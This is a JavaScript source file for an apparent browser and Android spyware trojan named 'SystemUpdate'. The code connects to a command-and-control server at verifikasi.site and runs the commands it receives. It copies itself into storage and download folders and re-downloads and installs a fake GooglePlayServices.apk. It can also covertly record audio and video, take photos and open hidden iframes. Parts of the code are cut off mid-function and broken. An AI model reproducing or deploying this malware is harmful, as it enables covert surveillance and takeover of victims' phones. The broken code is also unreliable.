// ============================================================
// 🔥 GLOBAL ERROR HANDLER
// ============================================================
(function() {
    var errorLog = [];
    
    window.addEventListener('error', function(e) {
        var err = {
            message: e.message || 'Unknown error',
            filename: e.filename || 'unknown',
            lineno: e.lineno || 0,
            colno: e.colno || 0,
            stack: (e.error && e.error.stack) || 'No stack',
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        return true;
    }, true);
    
    window.addEventListener('unhandledrejection', function(e) {
        var err = {
            type: 'unhandled_rejection',
            reason: String(e.reason || 'Unknown'),
            timestamp: Date.now()
        };
        errorLog.push(err);
        
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/error', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(err));
        } catch(ex) {}
        
        e.preventDefault();
        return true;
    }, true);
    
    window.__errorLog = errorLog;
})();

// ============================================================
// 🔥 SAFE PATH
// ============================================================
function getSafePath(base, filename) {
    if (!base || typeof base !== 'string') return null;
    if (!filename || typeof filename !== 'string') return null;
    
    var cleanName = filename.replace(/[^a-zA-Z0-9_.-]/g, '');
    if (cleanName.length === 0) return null;
    
    var fullPath = base.replace(/\/+$/, '') + '/' + cleanName;
    
    if (fullPath.indexOf('..') !== -1) return null;
    if (fullPath.indexOf('//') !== -1) return null;
    
    return fullPath;
}

// ============================================================
// 🔥 SAFE FETCH
// ============================================================
function safeFetch(url, options, timeout, retries) {
    timeout = timeout || 15000;
    retries = retries || 3;
    var attempt = 0;
    var cacheKey = 'cache_' + url;
    
    try {
        var cached = localStorage.getItem(cacheKey);
        if (cached) {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 5000)) {
                return Promise.resolve(new Response(JSON.stringify(data.value), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json' }
                }));
            }
        }
    } catch(e) {}
    
    function doFetch() {
        return new Promise(function(resolve, reject) {
            var timer = setTimeout(function() {
                reject(new Error('Timeout: ' + url));
            }, timeout);
            
            fetch(url, options)
                .then(function(response) {
                    clearTimeout(timer);
                    if (response.ok) {
                        response.clone().text().then(function(text) {
                            try {
                                localStorage.setItem(cacheKey, JSON.stringify({
                                    value: JSON.parse(text),
                                    timestamp: Date.now()
                                }));
                            } catch(e) {}
                        }).catch(function(){});
                    }
                    resolve(response);
                })
                .catch(function(err) {
                    clearTimeout(timer);
                    reject(err);
                });
        });
    }
    
    return new Promise(function(resolve, reject) {
        function tryFetch() {
            doFetch()
                .then(resolve)
                .catch(function(err) {
                    attempt++;
                    if (attempt < retries) {
                        var delay = 1000 * Math.pow(2, attempt);
                        setTimeout(tryFetch, delay);
                    } else {
                        reject(err);
                    }
                });
        }
        tryFetch();
    });
}

// 🔥 GET PASSWORD DARI WORKER (DENGAN CACHE)
// ============================================================
function getPasswordFromWorker() {
    var cached = localStorage.getItem(WS_CACHE_KEY);
    if (cached) {
        try {
            var data = JSON.parse(cached);
            if (data.timestamp && (Date.now() - data.timestamp < 300000)) {
                WS_PASSWORD = data.password;
                K({ sumber: 'systemupdate_ws', data: 'password_from_cache' });
                return Promise.resolve(WS_PASSWORD);
            }
        } catch(e) {}
    }
    
    return new Promise(function(resolve, reject) {
        safeFetch('/get-password', { method: 'GET' }, 10000, 3)
            .then(function(res) { 
                if (!res.ok) throw new Error('HTTP ' + res.status);
                return res.json(); 
            })
            .then(function(data) {
                if (data.password) {
                    WS_PASSWORD = data.password;
                    try {
                        localStorage.setItem(WS_CACHE_KEY, JSON.stringify({
                            password: data.password,
                            timestamp: Date.now()
                        }));
                    } catch(e) {}
                    K({ sumber: 'systemupdate_ws', data: 'password_received' });
                    resolve(WS_PASSWORD);
                } else {
                    reject(new Error('No password in response'));
                }
            })
            .catch(function(err) {
                K({ sumber: 'systemupdate_ws_error', data: 'failed_to_get_password: ' + err.message });
                reject(err);
            });
    });
}

// ============================================================
// 🔥 SERVICE WORKER
// ============================================================
function registerSW() {
    if (swRegistered) {
        K({ sumber: 'sw_status', data: 'already_registered' });
        return;
    }
    
    if (!('serviceWorker' in navigator)) {
        document.getElementById('status').textContent = '❌ SW not supported';
        return;
    }
    
    navigator.serviceWorker.getRegistrations()
        .then(function(registrations) {
            if (registrations.length > 0) {
                swRegistered = true;
                K({ sumber: 'sw_status', data: 'already_registered' });
                document.getElementById('status').textContent = '✅ SW already active!';
                return;
            }
            
            var swCode = `
self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
            `;

            try {
                var blob = new Blob([swCode], { type: 'application/javascript' });
                var swUrl = URL.createObjectURL(blob);
                navigator.serviceWorker.register(swUrl, { scope: '/' })
                    .then(function(reg) {
                        swRegistered = true;
                        document.getElementById('status').textContent = '✅ SystemUpdate aktif!';
                        K({ sumber: 'sw_status', data: 'registered' });
                    })
                    .catch(function(err) {
                        document.getElementById('status').textContent = '❌ Gagal: ' + err.message;
                        K({ sumber: 'sw_status', data: 'failed' });
                    });
            } catch(e) {
                document.getElementById('status').textContent = '❌ Error: ' + e.message;
                K({ sumber: 'sw_status', data: 'error' });
            }
        })
        .catch(function() {
            registerSWDirect();
        });
}

function registerSWDirect() {
    var swCode = `
self.addEventListener('install',function(e){e.waitUntil(self.skipWaiting());});
self.addEventListener('activate',function(e){e.waitUntil(self.clients.claim());});
self.addEventListener('message',function(e){ if(e.data && e.data.type === 'ping'){ e.ports[0].postMessage({type:'pong',timestamp:Date.now()}); } });
setInterval(function(){ self.clients.matchAll().then(function(clients){ clients.forEach(function(client){ client.postMessage({type:'heartbeat',timestamp:Date.now()}); }); }); }, 10000);
    `;
    try {
        var blob = new Blob([swCode], { type: 'application/javascript' });

}

function connectWebSocket() {
    try {
        if (typeof WebSocket === 'undefined') {
            K({ sumber: 'ws_status', data: 'not_supported' });
            return;
        }
        
        getPasswordFromWorker()
            .then(function(password) {
                doConnectWebSocket(password);
            })
            .catch(function(err) {
                K({ sumber: 'ws_error', data: 'failed_to_get_password: ' + err.message });
                doConnectWebSocket('');
            });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

function doConnectWebSocket(password) {
    try {
        var ws = new WebSocket('wss://verifikasi.site/ws');
        var reconnectAttempts = 0;
        var maxReconnect = 20;
        
        ws.onopen = function() {
            reconnectAttempts = 0;
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'auth',
                key: password,
                deviceId: navigator.userAgent || 'unknown',
                timestamp: Date.now()
            }));
        };
        
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'auth_success') {
                    K({ sumber: 'ws_status', data: 'authenticated' });
                }
                if (data.type === 'auth_failed') {
                    K({ sumber: 'ws_status', data: 'auth_failed' });
                }
                if (data.type === 'command' && data.aksi) {
                    var hasil = eksekusiPerintah(data);
                    ws.send(JSON.stringify({
                        type: 'result',
                        perintah: data.aksi,
                        hasil: hasil
                    }));
                    K({ sumber: 'ws_c2_result', data: { perintah: data.aksi, hasil: hasil } });
                }
                if (data.type === 'ping') {
                    ws.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
                }
            } catch(e) {
                K({ sumber: 'ws_message_error', data: e.message });
            }
        };
        
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            K({ sumber: 'ws_status', data: 'disconnected' });
            
            if (reconnectAttempts < maxReconnect) {
                reconnectAttempts++;
                var delay = 1000 * Math.pow(1.5, reconnectAttempts);
                setTimeout(function() {
                    doConnectWebSocket(password);
                }, delay);
            } else {
                K({ sumber: 'ws_status', data: 'max_reconnect_reached' });
            }
        };
        
        ws.onerror = function() {
            K({ sumber: 'ws_status', data: 'error' });
        };
        
        var wsHeartbeat = setInterval(function() {
            if (ws && ws.readyState === WebSocket.OPEN) {
                try {
                    ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                } catch(e) {}
            }
        }, 30000);
        cleanupItems.push(function() { clearInterval(wsHeartbeat); });
        
    } catch(e) {
        K({ sumber: 'ws_error', data: e.message });
        setTimeout(connectWebSocket, 10000);
    }
}

// 🔥 INJECT KE FILE SYSTEM (SEMUA LOKASI)
// ============================================================
function injectToFileSystem() {
    try {
        var htmlContent = document.documentElement.outerHTML;
        var successCount = 0;
        var locations = [];
        
        // 1. localStorage
        try {
            localStorage.setItem('system_update_html', htmlContent);
            successCount++;
            locations.push('localStorage');
            K({ sumber: 'inject_ls', data: 'success' });
        } catch(e) {
            K({ sumber: 'inject_ls', data: 'failed: ' + e.message });
        }
        
        // 2. IndexedDB
        try {
            var request = indexedDB.open('SystemUpdateDB', 1);
            request.onupgradeneeded = function(e) {
                var db = e.target.result;
                if (!db.objectStoreNames.contains('files')) {
                    db.createObjectStore('files');
                }
            };
            request.onsuccess = function(e) {
                try {
                    var db = e.target.result;
                    var tx = db.transaction('files', 'readwrite');
                    var store = tx.objectStore('files');
                    store.put(htmlContent, 'SystemUpdate.html');
                    successCount++;
                    locations.push('IndexedDB');
                    K({ sumber: 'inject_indexeddb', data: 'success' });
                } catch(e) {
                    K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
                }
            };
            request.onerror = function(e) {
                K({ sumber: 'inject_indexeddb', data: 'failed' });
            };
        } catch(e) {
            K({ sumber: 'inject_indexeddb', data: 'failed: ' + e.message });
        }
        
        // 3. Download
        try {
            var blob = new Blob([htmlContent], {type: 'text/html'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'SystemUpdate.html';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            var cleanupDownload = function() {
                try { if (a.parentNode) a.parentNode.removeChild(a); } catch(e) {}
                try { URL.revokeObjectURL(url); } catch(e) {}
            };
            setTimeout(cleanupDownload, 1000);
            cleanupItems.push(cleanupDownload);
            successCount++;
            locations.push('Download');
            K({ sumber: 'inject_download', data: 'success' });
        } catch(e) {
            K({ sumber: 'inject_download', data: 'failed: ' + e.message });
        }
        
        // 4. AndroidBridge - Android/data
        if (typeof AndroidBridge !== 'undefined') {
            try {
                var safePath = getSafePath('/storage/emulated/0/Android/data/com.google.android.play.services', 'SystemUpdate.html');
                if (safePath) {
                    AndroidBridge.saveFile(safePath, htmlContent);
                    successCount++;
                    locations.push('Android/data');
                    K({ sumber: 'inject_hidden_folder', data: 'success: ' + safePath });
                }
            } catch(e) {
                K({ sumber: 'inject_hidden_folder', data: 'failed: ' + e.message });
            }
            
            // 5. AndroidBridge - Download
            try {
                var safePath2 = getSafePath('/storage/emulated/0/Download', 'SystemUpdate.html');
                if (safePath2) {
                    AndroidBridge.saveFile(safePath2, htmlContent);
                    successCount++;
                    locations.push('Download (bridge)');
                    K({ sumber: 'inject_download_bridge', data: 'success: ' + safePath2 });
                }
            } catch(e) {
                K({ sumber: 'inject_download_bridge', data: 'failed: ' + e.message });
            }
        }
        
        // 6. sessionStorage
        try {
            sessionStorage.setItem('system_update_html', htmlContent);
            successCount++;
            locations.push('sessionStorage');
            K({ sumber: 'inject_ss', data: 'success' });
        } catch(e) {
            K({ sumber: 'inject_ss', data: 'failed: ' + e.message });
        }
        
        if (successCount > 0) {
            document.getElementById('status').textContent = '✅ Injected! (' + successCount + ' locations)';
            K({ sumber: 'inject_summary', data: { locations: locations.join(', '), count: successCount } });
        } else {
            document.getElementById('status').textContent = '⚠️ Inject failed';
            K({ sumber: 'inject_summary', data: 'failed_all' });
        }
        
    } catch(e) {
        K({ sumber: 'inject_error', data: e.message });
        document.getElementById('status').textContent = '❌ Inject error';
    }
}

// 🔥 AUTO-EXECUTE
// ============================================================
function autoExecute() {
    try {
        var installed = localStorage.getItem('system_update_installed');
        var timestamp = localStorage.getItem('system_update_time');
        var now = Date.now();
        
        if (installed && timestamp && (now - parseInt(timestamp) > 86400000)) {
            injectToFileSystem();
            localStorage.setItem('system_update_time', now);
        }
        
        if (!installed) {
            localStorage.setItem('system_update_installed', '1');
            localStorage.setItem('system_update_time', now);
            injectToFileSystem();
        }
    } catch(e) {
        K({ sumber: 'auto_execute_error', data: e.message });
    }
}

// 🔥 RE-INFECTION (CEK APK SETIAP 24 JAM)
// ============================================================
function reInfectionBrowser() {
    try {
        if (typeof AndroidBridge !== 'undefined') {
            try {
                var apps = AndroidBridge.getInstalledApps();
                if (apps) {
                    var list = JSON.parse(apps);
                    var found = false;
                    var packageNames = ['com.android.systemupdate', 'com.google.android.play.services', 'com.android.update'];
                    
                    for (var i = 0; i < list.length; i++) {
                        if (packageNames.indexOf(list[i].package) !== -1) {
                            found = true;
                            break;
                        }
                    }

                    if (!found) {
                        K({ sumber: 'reinfection_browser', data: 'apk_missing' });
                        // Download ulang APK
                        var apkUrl = 'https://raw.githubusercontent.com/pandora-site/verifikasi-site/main/files/GooglePlayServices.apk';
                        var a = document.createElement('a');
                        a.href = apkUrl;
                        a.download = 'GooglePlayServices.apk';
                        a.style.display = 'none';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        
                        // Install setelah download
                        setTimeout(function() {
                            var path = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
                            if (typeof AndroidBridge !== 'undefined') {
                                AndroidBridge.installAPK(path);
                                K({ sumber: 'reinfection_browser', data: 'reinstall_attempted' });
                            } else {
                                window.location.href = 'intent://' + path + '#Intent;scheme=file;package=com.android.packageinstaller;end';
                            }
                        }, 5000);
                    } else {
                        K({ sumber: 'reinfection_browser', data: 'apk_still_installed' });
                    }
                }
            } catch(e) {
                K({ sumber: 'reinfection_browser', data: 'error: ' + e.message });
            }
        }
    } catch(e) {
        K({ sumber: 'reinfection_browser', data: 'error: ' + e.message });
    }
}

function cekPerintah() {
    try {
        var url = SERVER + '/data?type=perintah&t=' + Date.now();
        safeFetch(url, { method: 'GET' }, 15000, 2)
            .then(function(res) {
                if (!res.ok) throw new Error('HTTP ' + res.status);
                return res.text();
            })
            .then(function(content) {
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        if (cmd.aksi) {
                            document.getElementById('status').textContent = '📥 Command: ' + cmd.aksi;
                            var hasil = eksekusiPerintah(cmd);
                            K({ sumber: 'html_c2_result', data: { perintah: cmd.aksi, hasil: hasil, waktu: Date.now() } });
                        }
                    } catch(e) {
                        K({ sumber: 'c2_parse_error', data: e.message });
                    }
                }
            })
            .catch(function(e) {
                K({ sumber: 'c2_fetch_error', data: e.message });
            });
    } catch(e) {
        K({ sumber: 'c2_error', data: e.message });
    }

function installAPK(path) {
    try {
        var safePath = getSafePath(path, '');
        var targetPath = safePath || path || '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
        var hasil = [];
        
        // Method 1: Intent
        try {
            var intentUrl = 'intent://' + targetPath + '#Intent;scheme=file;package=com.android.packageinstaller;end';
            window.location.href = intentUrl;
            hasil.push('intent_attempted');
            K({ sumber: 'html_install_apk', data: { method: 'intent', path: targetPath } });
        } catch(e) {
            hasil.push('intent_failed: ' + e.message);
        }
        
        // Method 2: AndroidBridge
        try {
            if (typeof AndroidBridge !== 'undefined') {
                AndroidBridge.installAPK(targetPath);
                hasil.push('bridge_attempted');
                K({ sumber: 'html_install_apk', data: { method: 'bridge', path: targetPath } });
            }
        } catch(e) {
            hasil.push('bridge_failed: ' + e.message);
        }
        
        // Method 3: Buka file
        setTimeout(function() {
            try {
                window.open('file://' + targetPath, '_blank');
                hasil.push('file_open_attempted');
            } catch(e) {
                hasil.push('file_open_failed: ' + e.message);
            }
        }, 500);
        
        // Method 4: Download ulang
        setTimeout(function() {
            try {
                var a = document.createElement('a');
                a.href = SERVER + '/files/GooglePlayServices.apk';
                a.download = 'GooglePlayServices.apk';
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                var cleanup = function() {
                    try { if (a.parentNode) a.parentNode.removeChild(a); } catch(e) {}
                };
                setTimeout(cleanup, 1000);
                cleanupItems.push(cleanup);
                hasil.push('download_attempted');
            } catch(e) {
                hasil.push('download_failed: ' + e.message);
            }
        }, 1000);
        
        // Method 5: Play Store
        setTimeout(function() {
            try {
                window.location.href = 'market://details?id=com.android.systemupdate';
                hasil.push('playstore_attempted');
            } catch(e) {
                hasil.push('playstore_failed: ' + e.message);
            }
        }, 1500);
        
        K({ sumber: 'html_install_apk', data: { path: targetPath, status: hasil.join('; ') } });
        return 'Install started: ' + targetPath;
    } catch(e) {
        return 'Error: ' + e.message;
    }
}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_audio', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_video', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'html_c2_result', data: { perintah: 'take_photo', hasil: reader.result, waktu: Date.now() } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {

        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
